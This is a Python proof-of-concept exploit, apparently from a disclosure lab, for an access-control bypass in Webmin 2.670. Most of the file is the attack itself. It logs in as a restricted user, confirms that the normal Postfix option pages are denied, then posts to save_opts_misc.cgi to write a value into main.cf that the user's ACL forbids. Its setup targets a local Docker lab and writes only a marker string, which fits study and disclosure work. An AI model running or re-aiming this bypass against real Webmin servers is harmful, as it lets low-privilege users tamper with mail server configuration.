#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: webmin-postfix-opts-acl (High: 8.1)
#  Vendor: Webmin
#  Versions: Webmin 2.670
#  Impact: save_opts_misc.cgi writes Postfix main.cf without general/startstop checks
#  Requires: Docker, git, python3, postfix
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "webmin-postfix-opts-acl"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _builtins.print(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _builtins.print(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_builtins.print = _cprint

"""Webmin 2.670: postfix/save_opts_misc.cgi skips general and startstop ACLs."""

import http.cookiejar
import json
import subprocess
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path

LABEL = "WEBMIN-H11-POSTFIX-ACL"
WITNESS = "WEBMIN-H11-POSTFIX-ACL"
IMAGE = "webmin-lab:2.670"
PIN = "2.670"
HOST = "127.0.0.1"
PORT = 18500
BASE = f"http://{HOST}:{PORT}"
PROJECT = "webminh11"
SERVICE = "webmin"
LIMITED_USER = "limited"
LIMITED_PASS = "lablimited"
HERE = Path(__file__).resolve().parent
DENIED = "You are not allowed to edit General Options"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args: object, **kwargs: object) -> None:
        return None


class LabError(Exception):
    def __init__(self, reason: str) -> None:
        super().__init__(reason)
        self.reason = reason


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    headers: dict[str, str]


def request(
    opener: urllib.request.OpenerDirector,
    method: str,
    path: str,
    *,
    form: dict[str, str] | None = None,
    timeout: int = 45,
) -> HttpResult:
    url = path if path.startswith("http") else f"{BASE}{path}"
    headers = {
        "Host": f"{HOST}:{PORT}",
        "User-Agent": "h11-lab/2.670",
        "Accept-Encoding": "identity",
        "Referer": f"{BASE}/postfix/",
    }
    data: bytes | None = None
    if form is not None:
        data = urllib.parse.urlencode(form).encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with opener.open(req, timeout=timeout) as resp:
            raw = resp.read()
            hdrs = {key.lower(): value for key, value in resp.headers.items()}
            return HttpResult(int(resp.status), raw.decode("utf-8", "replace"), hdrs)
    except urllib.error.HTTPError as exc:
        raw = exc.read()
        hdrs = {key.lower(): value for key, value in exc.headers.items()}
        return HttpResult(int(exc.code), raw.decode("utf-8", "replace"), hdrs)
    except urllib.error.URLError as exc:
        raise LabError("unreachable") from exc


def compose_exec(args: list[str]) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", PROJECT, "exec", "-T", SERVICE, *args],
        check=False,
        capture_output=True,
        text=True,
        cwd=HERE,
    )


def image_version() -> str:
    proc = subprocess.run(
        ["docker", "image", "inspect", IMAGE, "--format", "{{json .Config.Labels}}"],
        check=False,
        capture_output=True,
        text=True,
    )
    raw = (proc.stdout or "").strip()
    if not raw:
        return ""
    try:
        labels = json.loads(raw) or {}
    except json.JSONDecodeError:
        return ""
    for key in ("version", "webmin.version", "webmin.tag"):
        value = str(labels.get(key) or "").strip()
        if value:
            return value
    return ""


def denied(result: HttpResult) -> bool:
    if WITNESS in result.body and result.status in (200, 302):
        return False
    if result.status == 302:
        return False
    return (
        DENIED in result.body
        or "data-fatal-error-text" in result.body
        or result.status in (401, 403)
    )


def finish(lines: list[str], last: str) -> int:
    print(last, flush=True)
    lines.append(last)
    (HERE / "poc-last-run.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
    return 0 if last.startswith("SUCCESS ") else 1


def main() -> int:
    lines: list[str] = []

    def note(msg: str) -> None:
        print(msg, flush=True)
        lines.append(msg)

    try:
        label_version = image_version()
        note(f"IOC image={IMAGE} label-version={label_version or 'missing'}")

        ver = compose_exec(["cat", "/etc/webmin/version"])
        version = (ver.stdout or "").strip()
        note(f"IOC webmin-version={version or 'missing'}")
        if PIN not in version:
            return finish(lines, f"FAIL {LABEL} server-version {WITNESS}")
        if label_version and PIN not in label_version:
            return finish(lines, f"FAIL {LABEL} image-label {WITNESS}")

        acl = compose_exec(["cat", "/etc/webmin/postfix/limited.acl"])
        acl_text = acl.stdout or ""
        note(
            "IOC limited-acl "
            f"general={'0' if 'general=0' in acl_text else 'missing'} "
            f"startstop={'0' if 'startstop=0' in acl_text else 'missing'}"
        )
        if "general=0" not in acl_text or "startstop=0" not in acl_text:
            raise LabError("limited-acl")

        before = compose_exec(["postconf", "-h", "mail_name"])
        before_val = (before.stdout or "").strip()
        note(f"IOC before-mail_name={before_val or 'empty'} witness={int(WITNESS in before_val)}")
        if WITNESS in before_val:
            raise LabError("witness-preexisting")

        jar = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPCookieProcessor(jar))
        login_page = request(opener, "GET", "/session_login.cgi")
        note(f"IOC login-page status={login_page.status}")
        posted = request(
            opener,
            "POST",
            "/session_login.cgi",
            form={"user": LIMITED_USER, "pass": LIMITED_PASS, "page": "/"},
        )
        sid = next((cookie.value for cookie in jar if cookie.name == "sid"), "")
        note(f"IOC login status={posted.status} sid={int(bool(sid))}")
        if posted.status not in (302, 200) or not sid or sid == "x":
            return finish(lines, f"FAIL {LABEL} login-{posted.status} {WITNESS}")
        if "session_failed" in posted.body or "Invalid login" in posted.body:
            return finish(lines, f"FAIL {LABEL} login-rejected {WITNESS}")

        general = request(opener, "GET", "/postfix/general.cgi")
        note(
            f"IOC general.cgi status={general.status} "
            f"denied={int(DENIED in general.body)}"
        )
        if not denied(general):
            return finish(lines, f"FAIL {LABEL} general-not-denied {WITNESS}")

        save_opts = request(
            opener,
            "POST",
            "/postfix/save_opts.cgi",
            form={"mail_name_def": WITNESS},
        )
        note(
            f"IOC save_opts.cgi status={save_opts.status} "
            f"denied={int(denied(save_opts))} redirect={save_opts.headers.get('location', '')}"
        )
        if save_opts.status == 302 or not denied(save_opts):
            return finish(lines, f"FAIL {LABEL} save-opts-not-denied {WITNESS}")

        mid = compose_exec(["postconf", "-h", "mail_name"])
        mid_val = (mid.stdout or "").strip()
        note(f"IOC after-denied-mail_name={mid_val or 'empty'} witness={int(WITNESS in mid_val)}")
        if WITNESS in mid_val:
            return finish(lines, f"FAIL {LABEL} denied-still-wrote {WITNESS}")

        bypass = request(
            opener,
            "POST",
            "/postfix/save_opts_misc.cgi",
            form={"mail_name_def": WITNESS},
        )
        location = bypass.headers.get("location", "")
        note(
            f"IOC save_opts_misc.cgi status={bypass.status} "
            f"location={location} error={int('data-fatal-error-text' in bypass.body)}"
        )
        if "data-fatal-error-text" in bypass.body or DENIED in bypass.body:
            snippet = bypass.body.replace("\n", " ")[:180]
            note(f"IOC save_opts_misc-body={snippet}")
            return finish(lines, f"FAIL {LABEL} save-opts-misc-denied {WITNESS}")
        if bypass.status not in (200, 302):
            return finish(lines, f"FAIL {LABEL} save-opts-misc-{bypass.status} {WITNESS}")

        after = compose_exec(["postconf", "-h", "mail_name"])
        after_val = (after.stdout or "").strip()
        main_cf = compose_exec(["grep", WITNESS, "/etc/postfix/main.cf"])
        note(
            f"IOC after-mail_name={after_val or 'empty'} "
            f"main.cf={int(WITNESS in (main_cf.stdout or ''))}"
        )
        if WITNESS not in after_val:
            return finish(lines, f"FAIL {LABEL} postconf-missing {WITNESS}")
        if WITNESS not in (main_cf.stdout or ""):
            return finish(lines, f"FAIL {LABEL} main-cf-missing {WITNESS}")
        return finish(lines, f"SUCCESS {LABEL} {WITNESS}")
    except LabError as exc:
        return finish(lines, f"FAIL {LABEL} {exc.reason} {WITNESS}")
    except OSError:
        return finish(lines, f"FAIL {LABEL} os-error {WITNESS}")


if __name__ == "__main__":
    raise SystemExit(main())

